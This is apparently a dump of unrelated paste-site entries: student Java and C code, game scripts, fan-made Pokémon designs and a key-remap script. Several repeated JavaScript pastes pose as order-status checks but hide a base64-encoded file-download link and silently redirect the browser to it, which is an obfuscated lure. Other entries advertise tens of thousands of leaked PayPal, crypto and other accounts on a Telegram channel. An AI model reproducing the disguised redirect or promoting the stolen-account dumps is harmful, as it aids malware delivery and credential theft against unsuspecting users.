  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
JpKvgXvP,Market.js,x2LeaF,JavaScript,Saturday 26th of April 2025 09:53:57 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/64184/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
zSPj7Urw,Untitled,x2LeaF,JavaScript,Saturday 26th of April 2025 09:38:35 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/53232/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
pUW0BEte,Crypto Accounts,x2LeaF,JavaScript,Saturday 26th of April 2025 09:31:27 AM CDT,03414 Accounts Posted On https://t.me/leakedbyem1nem
aKYMXDPT,Recurshen,Dunscy,Python,Saturday 26th of April 2025 09:29:13 AM CDT,"Terrachic
Grass chick pokemon 

Grass
40/20/25/20/25/25
Regenerator / earth eater // rocky payload 

dex :
(solar): they are very weak by themselves, so they flock to agavhen for protection.
(hydro): they need little food or light, so they live all over the region

Every move in the line can be learned as terrachic 


Agavhen
Stonecrop pokemon 

Grass/rock
75/63/70/56/69/34
Regenerator / regrowth (!) // friend guard

dex:
(solar): one agavhen may carry as many as 40 terrachik in its thorny plumage
(Hydro): it can subsist entirely on sunlight and small stones or soil

Recurshen
recursive pokemon 

Grass/rock 
88/95/100/70/95/35
Regenerator /regrowth (!) // friend guard 

Dex: 
(solar): it spends most of its free time training its children to protect their children and other small pokemon
(hydro): research has yet to find an end to the space in its tail, but drones have found berries that can only be eaten by the terrachik line

(!) Regrowth: when fainting, swap forms and fully recover hp. New form has identical stats, typing, and ability as previous evolution counts as a faint for last respects/revenge. Will chain if possible, but if not (slot 3>2>1)

movelist:
Terablast
Hidden Power
Rest
Protect
Endure
Substitute
Attract
Captivate
Double Team
Facade
Round
Swagger
Sleep Talk
Confide
after you 
baton pass 
body slam 
defence curl 
egg bomb 
encore
endeavor
endure
flail
focus energy
follow me
fury attack
glare
growth
heal bell
helping hand
mean look
pain split
retaliate
tackle
pin missile
beat up
hone claws
scale shot
play rough
body press
bulk up
final gambit
no retreat
sunny day
drill peck
feather dance
peck
roost
wing attack
curse
grudge
last respects
spite
absorb
bullet seed
grass knot
grassy terrain
ingrain
leaf blade
leaf tornado
leafage
magical leaf
seed bomb
solar beam
solar blade
trailblaze
ancient power
power gem
rock blast
rock slide
rollout
smack down
stealth rock
wide guard
bulldoze
Earthquake
rototiller
zen headbutt
rain dance"
dE5uttYt,PayPal with Balance,x2LeaF,JavaScript,Saturday 26th of April 2025 09:16:05 AM CDT,14734 Accounts Posted On https://t.me/leakedbyem1nem
6iHaWrBE,[NP] Delivery App,dzocesrce,Java,Saturday 26th of April 2025 09:15:08 AM CDT,"//most fatigued one yet
import java.util.*;
import java.util.stream.Collectors;

class User implements Comparable<User> {
    String id;
    String name;
    double moneySpent;
    int deliveries;

    public User(String id, String name) {
        this.id = id;
        this.name = name;
        this.moneySpent=0;
        this.deliveries=0;
    }

    public String getId() {
        return id;
    }

    public int getDeliveries() {
        return deliveries;
    }

    public String getName() {
        return name;
    }

    public void addDeliveries() {
        this.deliveries++;
    }

    public void addMoney(double amount) {
        moneySpent += amount;
    }

    public double getMoneySpent(){
        return moneySpent;
    }

    private double getAverageAmountSpent() {
        if(getDeliveries()==0)
            return 0;
        return getMoneySpent()/getDeliveries();
    }

    @Override
    public String toString() {
        return String.format(""ID: %s Name: %s Total orders: %d Total amount spent: %.2f Average amount spent: %.2f"",
                getId(),getName(),getDeliveries(),getMoneySpent(),getAverageAmountSpent());
    }

    @Override
    public int compareTo(User o) {
        return Comparator.comparing(User::getMoneySpent).reversed()
                .thenComparing(User::getName,Comparator.reverseOrder())
                .compare(this,o);
    }

}
class Restoraunt implements Comparable<Restoraunt>,Location{
    String id;
    String name;
    Location location;
    double moneyEarned;
    int deliveries;

    public Restoraunt(String id, String name, Location location) {
        this.id = id;
        this.name = name;
        this.location = location;
        this.moneyEarned = 0;
        this.deliveries= 0;
    }

    public void addMoney(double money) {
        this.moneyEarned += money;
    }

    public void addDeliveries(){
        this.deliveries++;
    }

    public double getAverageAmountEarned() {
        if(getDeliveries()==0)
            return 0;
        return getMoneyEarned()/getDeliveries();
    }

    public double getMoneyEarned() {
        return moneyEarned;
    }

    public int getDeliveries() {
        return deliveries;
    }

    public String getId() {
        return id;
    }

    public String getName() {
        return name;
    }

    public Location getLocation() {
        return location;
    }

    @Override
    public String toString() {
        return String.format(""ID: %s Name: %s Total orders: %d Total amount earned: %.2f Average amount earned: %.2f"",
                getId(),getName(),getDeliveries(),getMoneyEarned(),getAverageAmountEarned());
    }

    @Override
    public int compareTo(Restoraunt o) {
        return Comparator.comparing(Restoraunt::getAverageAmountEarned)
                .reversed()
                .thenComparing(Restoraunt::getName,Comparator.reverseOrder())
                .compare(this,o);
    }

    @Override
    public int getX() {
        return location.getX();
    }

    @Override
    public int getY() {
        return location.getY();
    }

    @Override
    public int distance(Location location) {
        return Location.super.distance(location);
    }
}
class LocationCreator {
    public static Location create(int x, int y) {

        return new Location() {
            @Override
            public int getX() {
                return x;
            }

            @Override
            public int getY() {
                return y;
            }
        };
    }
}
interface Location {
    int getX();

    int getY();

    default int distance(Location other) {
        int xDiff = Math.abs(getX() - other.getX());
        int yDiff = Math.abs(getY() - other.getY());
        return xDiff + yDiff;
    }
}

class DeliveryPerson implements Comparable<DeliveryPerson>,Location{
    String id;
    String name;
    Location location;
    double moneyEarned;
    int deliveries;

    public DeliveryPerson(String id, String name, Location location) {
        this.id = id;
        this.name = name;
        this.location = location;
        this.moneyEarned = 0;
        this.deliveries = 0;
    }

    public void addDeliveries() {
        this.deliveries++;
    }

    public int getDeliveries() {
        return deliveries;
    }

    public void setLocation(Location location) {
        this.location = location;
    }

    public void addMoney(double amount) {
        moneyEarned += amount;
    }

    public double getMoneyEarned() {
        return moneyEarned;
    }

    public String getId() {
        return id;
    }

    public String getName() {
        return name;
    }

    public Location getLocation() {
        return location;
    }


    public double getAverageAmountEarned() {
        if(getDeliveries()==0)
            return 0;
        return getMoneyEarned()/getDeliveries();
    }


    @Override
    public String toString() {
        return String.format(""ID: %s Name: %s Total deliveries: %d Total delivery fee: %.2f Average delivery fee: %.2f"",
                getId(),getName(),getDeliveries(),getMoneyEarned(),getAverageAmountEarned());
    }
    
    @Override
    public int compareTo(DeliveryPerson o) {
        return Comparator.comparing(DeliveryPerson::getMoneyEarned).reversed()
                .thenComparing(DeliveryPerson::getName,Comparator.reverseOrder()).compare(this,o);
    }

    @Override
    public int getX() {
        return location.getX();
    }

    @Override
    public int getY() {
        return location.getY();
    }

    @Override
    public int distance(Location location) {
        return Location.super.distance(location);
    }
}

public class DeliveryAppTester {
    public static void main(String[] args) {
        Scanner sc = new Scanner(System.in);
        String appName = sc.nextLine();
        DeliveryApp app = new DeliveryApp(appName);
        while (sc.hasNextLine()) {
            String line = sc.nextLine();
            String[] parts = line.split("" "");

            if (parts[0].equals(""addUser"")) {
                String id = parts[1];
                String name = parts[2];
                app.addUser(id, name);
            } else if (parts[0].equals(""registerDeliveryPerson"")) {
                String id = parts[1];
                String name = parts[2];
                int x = Integer.parseInt(parts[3]);
                int y = Integer.parseInt(parts[4]);
                app.registerDeliveryPerson(id, name, LocationCreator.create(x, y));
            } else if (parts[0].equals(""addRestaurant"")) {
                String id = parts[1];
                String name = parts[2];
                int x = Integer.parseInt(parts[3]);
                int y = Integer.parseInt(parts[4]);
                app.addRestaurant(id, name, LocationCreator.create(x, y));
            } else if (parts[0].equals(""addAddress"")) {
                String id = parts[1];
                String name = parts[2];
                int x = Integer.parseInt(parts[3]);
                int y = Integer.parseInt(parts[4]);
                app.addAddress(id, name, LocationCreator.create(x, y));
            } else if (parts[0].equals(""orderFood"")) {
                String userId = parts[1];
                String userAddressName = parts[2];
                String restaurantId = parts[3];
                float cost = Float.parseFloat(parts[4]);
                app.orderFood(userId, userAddressName, restaurantId, cost);
            } else if (parts[0].equals(""printUsers"")) {
                app.printUsers();
            } else if (parts[0].equals(""printRestaurants"")) {
                app.printRestaurants();
            } else {
                app.printDeliveryPeople();
            }

        }
    }
}

class DeliveryApp {
    String name;
    Map<String,User> users;
    Map<String,DeliveryPerson> deliverypersons;
    Map<String,Restoraunt> restoraunts;
    Map<String, Map<String,Address>> addresses;
    public static final int ORDER_AMOUNT=90;

    public DeliveryApp(String name) {
        this.name = name;
        users = new HashMap<String,User>();
        deliverypersons = new HashMap<String,DeliveryPerson>();
        restoraunts = new HashMap<String,Restoraunt>();
        addresses = new HashMap<String,Map<String,Address>>();
    }

    public void addUser(String id, String name) {
        users.putIfAbsent(id,new User(id,name));
    }

    public void registerDeliveryPerson(String id, String name, Location location) {
        deliverypersons.putIfAbsent(id,new DeliveryPerson(id,name,location));
    }

    public void addRestaurant(String id, String name, Location location) {
        restoraunts.putIfAbsent(id,new Restoraunt(id,name,location));
    }

    public void addAddress(String id, String name, Location location) {
        addresses.putIfAbsent(id,new HashMap<>());
        addresses.get(id).putIfAbsent(name,new Address(name,location));
    }

    public void orderFood(String userId, String userAddressName, String restaurantId, float cost) {
        Location userLocation = addresses.get(userId).get(userAddressName).getLocation();
        DeliveryPerson deliveryPerson = getClosest(restaurantId);
        Location deliveryLocation = deliveryPerson.getLocation();
        deliverypersons.get(deliveryPerson.getId()).setLocation(userLocation);
		//this is the only flawed compute logic... not able to figure it out yet but it's good enough per Test Cases
        deliverypersons.get(deliveryPerson.getId()).addMoney(ORDER_AMOUNT+(deliveryLocation.distance(restoraunts.get(restaurantId).getLocation())/10)*10);
        deliverypersons.get(deliveryPerson.getId()).addDeliveries();
        users.get(userId).addMoney(cost);
        users.get(userId).addDeliveries();
        restoraunts.get(restaurantId).addMoney(cost);
        restoraunts.get(restaurantId).addDeliveries();
        deliveryPerson.setLocation(userLocation);
    }

    private DeliveryPerson getClosest(String restaurantId) {
        Location resLocation = restoraunts.get(restaurantId).getLocation();

        List<DeliveryPerson> closestDeliveryPerson = deliverypersons.values().stream().sorted(Comparator
                .comparing(i -> i.getLocation().distance(resLocation),Comparator.naturalOrder()))
             //   .sorted(Comparator.comparing(i->i.getDeliveries(),Comparator.reverseOrder()))
                .collect(Collectors.toList());

		//since I could not use thenComparing, or didn't know exactly how to, I manually do another sort if needed.
        if(closestDeliveryPerson.get(0).distance(resLocation)==closestDeliveryPerson.get(1).distance(resLocation))
            closestDeliveryPerson = deliverypersons.values().stream()
                    .sorted(Comparator.comparing(i->i.getDeliveries(),Comparator.naturalOrder()))
                    .collect(Collectors.toList());

        return closestDeliveryPerson.get(0);
    }

    public void printUsers() {
        users.values().stream().sorted().forEach(i-> System.out.println(i));
    }

    public void printRestaurants() {
        restoraunts.values().stream().sorted().forEach(i-> System.out.println(i));
    }

    public void printDeliveryPeople() {
        deliverypersons.values().stream().sorted().forEach(i-> System.out.println(i));
    }
}

class Address {
    String addressName;
    Location location;

    public Address(String addressName, Location location) {
        this.addressName = addressName;
        this.location = location;
    }

    public String getAddressName() {
        return addressName;
    }

    public Location getLocation() {
        return location;
    }
}
"
0mVXiBbe,Untitled,dllbridge,C,Saturday 26th of April 2025 09:14:42 AM CDT,"

#include <iostream>
#include  <iomanip>
#include <string.h>
using namespace std;

void foo(char *sz);




////////////////////////////////////////////////////////////
int main() 
{

    char sz[99] = ""SONY Pictures"";
    
   // cout << ""Size of sz = "" << sizeof(sz) << endl;
 
    foo(sz);
}




////////////////////////////////////////////////////////////
void foo(char *sz)
{
     
     int nLen = strlen(sz);
     
    for(int i = 0; i < nLen; i++)
    {
        cout << ""sz["" << setw(2) << i << ""] = "" << sz[i] << endl;
    }     
     
     
}












/*
#include <iostream>
using namespace std;

void foo(int *nArr);




////////////////////////////////////////////////////////////
int main() 
{

    int nArr[5] = {7, 2, 2147483647, 21, 9};
    
    int n;
    
    cout << ""Size of nArr[2] = "" << sizeof(nArr  ) << endl;
    cout << ""Size of double  = "" << sizeof(double) << endl;    
    cout << ""Size of char    = "" << sizeof(char  ) << endl;     
    foo(nArr);
}




////////////////////////////////////////////////////////////
void foo(int *n_Arr)
{
     
     
     
}


*/




















/*
#include <iostream>
using namespace std;

void foo(int *nArr);




////////////////////////////////////////////////////////////
int main() 
{

    int nArr[5] = {7, 2, 2147483647, 21, 9};
    
    
    foo(nArr);
}




////////////////////////////////////////////////////////////
void foo(int *n_Arr)
{
     
     int *p = &n_Arr[2];
     
     cout << ""nArr[2] = "" <<      p[-2]   << endl; 
     cout << ""nArr[2] = "" <<  n_Arr[ 0]   << endl; 	p -= 2;
     cout << ""nArr[2] = "" <<     *p       << endl;	     
}


*/








/*
#include <iostream>
using namespace std;

void foo(int *nArr);




////////////////////////////////////////////////////////////
int main() 
{

    int nArr[5] = {33, 2, 2147483647, 21, 9};
    
    
    foo(nArr);
}




////////////////////////////////////////////////////////////
void foo(int *n_Arr)
{
     
     int *p = &n_Arr[2];
     
     cout << ""nArr[2] = "" <<      p[-2]   << endl; 
     cout << ""nArr[2] = "" <<  n_Arr[ 0]   << endl; 	p = &n_Arr[0];
     cout << ""nArr[2] = "" <<     *p       << endl;	     
}


*/











/*

#include <iostream>
using namespace std;



////////////////////////////////////////////////////////////
int main() 
{

    int nArr[5] = {33, 2, 7, 21, 9};
    
    int *p = &nArr[2];
    
    cout << ""nArr[2] = "" <<     p[0]   << endl; 
    cout << ""nArr[2] = "" <<  nArr[2]   << endl; 	
    cout << ""nArr[2] = "" <<    *p      << endl;	

}
*/











/*
#include <iostream>
using namespace std;


int  n = 2271;
int *p = &n;




////////////////////////////////////////////////////////////
int main() 
{

  
    
    cout << ""n = "" << *p    << endl; 
    cout << ""n = "" <<  n    << endl; 	
    cout << ""n = "" <<  p[0] << endl;	

}

*/



"
jACZ3WSV,Granboar,Dunscy,Python,Saturday 26th of April 2025 09:14:24 AM CDT,"Granboar (Granite + Boar)

**Type:** Rock
**Stats:** 125 / 90 / 120 / 55/ 75 / 50 // 515 BST
**Abilities** Sturdy/Stamina//Solid Rock

**Dex:** Packs of these behemoths are often mistaken for boulder fields left by landslides as they tend not to move much. Their rocky hide is so thick they hardly notice if a climber hammers in a tie off for climbing. 

**Learnset:**

Ancient Power
Attract
Belch
Bide
Bite
Block 
Body Press
Body Slam
Boulder Bash
Bulldoze
Bulk Up
Chip Away
Confide
Counter
Crunch
Curse
Double Team
Double-Edge
Earth Power
Earthquake
Endure
Facade
Fire Fang
Fissure
Focus Blast
Frustration
Giga Impact
Hard Press
Harden
Head Smash
Headbutt
Heat Crash
Heavy Slam
Helping Hand
Hidden Power
High Horsepower
Hyper Beam
Ice Fang
Iron Defense
Iron Head
Lash Out
Megahorn
Meteor Beam
Mud Shot
Mud Slap
Mud Sport
Odor Sleuth
Play Rough
Power Gem
Protect
Rest
Roar
Rock Blast
Rock Polish
Rock Slide
Rock Smash
Rock Throw
Rock Tomb
Rollout
Rototiller
Sandstorm
Scary Face
Slack Off
Sleep Talk
Smack Down
Spikes
Stealth Rock
Stomping Tantrum
Stone Edge
Strength
Substitute
Superpower
Swagger
Tackle
Take Down
Tera Blast
Thunder Fang
Toxic
Trailblaze
Wide Guard
Work Up
Yawn

Pebblet (Pebble/Piglet)
**Type:** Rock
**Stats:** 80/50/60/25/50/50 // 315
**Abilities** Sturdy/Reckless// Solid Rock

Unlike it's evolution, Pebblet love to run around, rolling down the hills and slopes near their pack. They are a bit too playful at times and have been known to run into passing hikers

**Learnset:**

Ancient Power
Attract
Belch
Bide
Bite
Block 
Body Slam
Boulder Bash
Bulldoze
Bulk Up
Chip Away
Confide
Counter
Curse
Double Team
Earthquake
Endure
Facade
Focus Blast
Frustration
Harden
Headbutt
Helping Hand
Hidden Power
High Horsepower
Iron Defense
Iron Head
Lash Out
Mud Shot
Mud Slap
Mud Sport
Odor Sleuth
Play Rough
Power Gem
Protect
Rest
Roar
Rock Blast
Rock Polish
Rock Slide
Rock Smash
Rock Throw
Rock Tomb
Rollout
Rototiller
Sandstorm
Scary Face
Slack Off
Sleep Talk
Smack Down
Spikes
Stealth Rock
Stomping Tantrum
Stone Edge
Strength
Substitute
Superpower
Swagger
Tackle
Take Down
Tera Blast
Toxic
Trailblaze
Wide Guard
Work Up
Yawn"
BUuRQngU,PoE2 - Rebind Shift with Space and vice-versa,Pandamonium_42,Autohotkey,Saturday 26th of April 2025 09:11:01 AM CDT,"#Persistent
#SingleInstance Force

; Check active window every 5ms
SetTimer, CheckWindow, 5
return

CheckWindow:
    WinGet, pid, PID, A
    if (pid) {
        Process, Exist, pathofexilesteam.exe
        if (pid == ErrorLevel) {
            ; Remap inside the game
            Hotkey, *Space, SpaceAsShift, On
            Hotkey, *Shift, ShiftAsSpace, On
            return
        }
    }
    ; Otherwise, turn remaps off
    Hotkey, *Space, SpaceAsShift, Off
    Hotkey, *Shift, ShiftAsSpace, Off
return

SpaceAsShift:
    Send {Shift down}
    KeyWait, Space
    Send {Shift up}
return

ShiftAsSpace:
    Send {Space down}
    KeyWait, Shift
    Send {Space up}
return"
GqEYhjKb,Leaked Accounts - Fresh Hits,x2LeaF,JavaScript,Saturday 26th of April 2025 09:00:41 AM CDT,56975 Accounts Posted On https://t.me/leakedbyem1nem
nP5K9cy0,Cell Health Bar Direction,gelatine87,Lua,Saturday 26th of April 2025 08:50:31 AM CDT,"-- Settings
-- Possible values: 
--    ""LTR""     - Left to Right,
--    ""RTL""     - Right to Left,
--    ""TTB""    - Top to Bottom,
--    ""BTT""    - Bottom to top
local FILL_DIRECTION = ""BTT""

local ATTENUATE_DEAD_BARS = true

local function reanchorOutlets(P, outlet, healthBar)
    P.ClearPoints(outlet)
    P.Point(outlet, ""TOPLEFT"", healthBar:GetStatusBarTexture(), ""TOPRIGHT"")
    P.Point(outlet, ""BOTTOMLEFT"", healthBar:GetStatusBarTexture(), ""BOTTOMRIGHT"")
end

local function reanchorInlets(P, inlet, healthBar)
    P.ClearPoints(inlet)
    P.Point(inlet, ""TOPLEFT"", healthBar:GetStatusBarTexture())
    P.Point(inlet, ""BOTTOMLEFT"", healthBar:GetStatusBarTexture())
end

local function reanchorVerticalOutlets(P, outlet, healthBar)
    P.ClearPoints(outlet)
    P.Point(outlet, ""TOPLEFT"", healthBar:GetStatusBarTexture(), ""BOTTOMLEFT"")
    P.Point(outlet, ""TOPRIGHT"", healthBar:GetStatusBarTexture(), ""BOTTOMRIGHT"")
end

local function reanchorVerticalInlets(P, inlet, healthBar)
    P.ClearPoints(inlet)
    P.Point(inlet, ""TOPLEFT"", healthBar:GetStatusBarTexture())
    P.Point(inlet, ""TOPRIGHT"", healthBar:GetStatusBarTexture())
end

local function applyFillDirection()
    Cell.funcs.IterateAllUnitButtons(function(b)
            local P = Cell.pixelPerfectFuncs
            local healthBar = b.widgets.healthBar
            local healthBarLoss = b.widgets.healthBarLoss
            
            if FILL_DIRECTION == ""LTR"" then
                healthBar:SetOrientation(""HORIZONTAL"")
                healthBar:SetReverseFill(true)
                
                P.ClearPoints(healthBarLoss)
                P.Point(healthBarLoss, ""TOPLEFT"", healthBar:GetStatusBarTexture(), ""TOPRIGHT"")
                P.Point(healthBarLoss, ""BOTTOMRIGHT"", healthBar, ""BOTTOMRIGHT"")
                
                reanchorOutlets(P, b.widgets.damageFlashTex, healthBar)
                reanchorOutlets(P, b.widgets.incomingHeal, healthBar)
                reanchorOutlets(P, b.widgets.shieldBar, healthBar)
                
                reanchorInlets(P, b.widgets.shieldBarR, healthBar)
                reanchorInlets(P, b.widgets.absorbsBar, healthBar)
                
            elseif FILL_DIRECTION == ""RTL"" then
                healthBar:SetOrientation(""HORIZONTAL"")
                healthBar:SetReverseFill(false)
                
                P.ClearPoints(healthBarLoss)
                P.Point(healthBarLoss, ""TOPLEFT"", healthBar, ""TOPLEFT"")
                P.Point(healthBarLoss, ""BOTTOMRIGHT"", healthBar:GetStatusBarTexture(), ""BOTTOMLEFT"")
                
                reanchorOutlets(P, b.widgets.damageFlashTex, healthBar)
                reanchorOutlets(P, b.widgets.incomingHeal, healthBar)
                reanchorOutlets(P, b.widgets.shieldBar, healthBar)
                
                reanchorInlets(P, b.widgets.shieldBarR, healthBar)
                reanchorInlets(P, b.widgets.absorbsBar, healthBar)
                
            elseif FILL_DIRECTION == ""TTB"" then
                healthBar:SetOrientation(""VERTICAL"")
                healthBar:SetReverseFill(false)
                
                P.ClearPoints(healthBarLoss)
                P.Point(healthBarLoss, ""TOPLEFT"", healthBar, ""TOPLEFT"")
                P.Point(healthBarLoss, ""BOTTOMRIGHT"", healthBar:GetStatusBarTexture(), ""TOPRIGHT"")
                
                reanchorVerticalOutlets(P, b.widgets.damageFlashTex, healthBar)
                reanchorVerticalOutlets(P, b.widgets.incomingHeal, healthBar)
                reanchorVerticalOutlets(P, b.widgets.shieldBar, healthBar)
                
                reanchorVerticalInlets(P, b.widgets.shieldBarR, healthBar)
                reanchorVerticalInlets(P, b.widgets.absorbsBar, healthBar)
                
            elseif FILL_DIRECTION == ""BTT"" then
                healthBar:SetOrientation(""VERTICAL"")
                healthBar:SetReverseFill(true)
                
                P.ClearPoints(healthBarLoss)
                P.Point(healthBarLoss, ""TOPLEFT"", healthBar:GetStatusBarTexture(), ""BOTTOMLEFT"")
                P.Point(healthBarLoss, ""BOTTOMRIGHT"", healthBar, ""BOTTOMRIGHT"")
                
                reanchorVerticalOutlets(P, b.widgets.damageFlashTex, healthBar)
                reanchorVerticalOutlets(P, b.widgets.incomingHeal, healthBar)
                reanchorVerticalOutlets(P, b.widgets.shieldBar, healthBar)
                
                reanchorVerticalInlets(P, b.widgets.shieldBarR, healthBar)
                reanchorVerticalInlets(P, b.widgets.absorbsBar, healthBar)
            end
            
            -- Special cases
            local overAbsorbGlow = b.widgets.overAbsorbGlow
            local overShieldGlow = b.widgets.overShieldGlow
            P.ClearPoints(overAbsorbGlow)
            P.ClearPoints(overShieldGlow)
            
            if FILL_DIRECTION == ""LEFT_TO_RIGHT"" or FILL_DIRECTION == ""RIGHT_TO_LEFT"" then
                P.Point(overAbsorbGlow, ""TOPRIGHT"")
                P.Point(overAbsorbGlow, ""BOTTOMRIGHT"")
                P.Point(overShieldGlow, ""TOPLEFT"")
                P.Point(overShieldGlow, ""BOTTOMLEFT"")
            else
                P.Point(overAbsorbGlow, ""TOP"")
                P.Point(overShieldGlow, ""TOP"")
            end
    end)
end

function hookCell()
    if Cell.__fill_direction_hook_installed then return end
    
    if ATTENUATE_DEAD_BARS then
        local F = Cell.funcs
        local oldGetHealthBarColor = F.GetHealthBarColor
        F.GetHealthBarColor = function(...)
            local colors = {oldGetHealthBarColor(...)}
            if not isDeadOrGhost then
                return unpack(colors)
            end
            return colors[4], colors[5], colors[6], colors[1], colors[2], colors[3]
        end
        
        Cell.funcs.IterateAllUnitButtons(function(button)
                local originalSetVertexColor = button.widgets.healthBarLoss.SetVertexColor
                button.widgets.healthBarLoss.SetVertexColor = function(self, r, g, b, a)
                    local dead = button.states.isDeadOrGhost or button.states.isDead
                    if dead then
                        r, g, b, a = button.widgets.healthBar:GetStatusBarColor()
                    end
                    originalSetVertexColor(self, r, g, b, a)
                end
        end)
    end
    
    local B = Cell.bFuncs
    hooksecurefunc(B, ""SetOrientation"", function()
            applyFillDirection()
    end)
    
    applyFillDirection()
    Cell.__fill_direction_hook_installed = true
end

hookCell()
Cell.RegisterCallback(""AddonLoaded"", ""FillDirectionHook"", hookCell)"
XiiRmiC5,Products.js,hubertzoo90,JavaScript,Saturday 26th of April 2025 08:46:56 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/25318/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
8RHZ12Fq,Chaturbate with Tokens,x2LeaF,JavaScript,Saturday 26th of April 2025 08:45:19 AM CDT,14073 Accounts Posted On https://t.me/leakedbyem1nem
N0mkQCxV,mineLib,Jameelo,Lua,Saturday 26th of April 2025 08:35:12 AM CDT,"--[[
    Library focussed on moving about & mining
]]

function digForward(length) -- Variable length dig forward command.
    if length == nil then
        length = 1 -- default
    end
    for _ = 1,length,1 do
        turtle.dig()
        turtle.forward()
        if everySlotTaken() == true then
            print(""Storage full! Dumping items..."")
            dumpItems()
        end
    end
end

function placeMoveForward(length, block) -- places the currently selected block & moves forward.
    --[[
        True - returned as length was reached
        False - returned due to lack of items
    ]]

    for _ = 1,length,1 do        
        if turtle.getItemCount() == 0 then -- if no blocks are left, reload.
            newSlot = findItemBF(block)
            if newSlot > 0 then -- if there is another stack in the inventory
                turtle.select(newSlot) -- select another instance of the block
            else
                return false -- ran outta blocks
            end
        end

        if turtle.detect() then -- if there is an obstacle, even though there shouldn't be.
            turtle.dig() -- This opens up the possibility of filling the inventory I guess? Not an issue atm.
        end

        if turtle.detectDown() then
            turtle.forward()
        else
            turtle.placeDown()
            turtle.forward()
        end
    end

    return true
end"
Svp16edF,Order.js,hubertzoo90,JavaScript,Saturday 26th of April 2025 08:31:33 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/71853/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
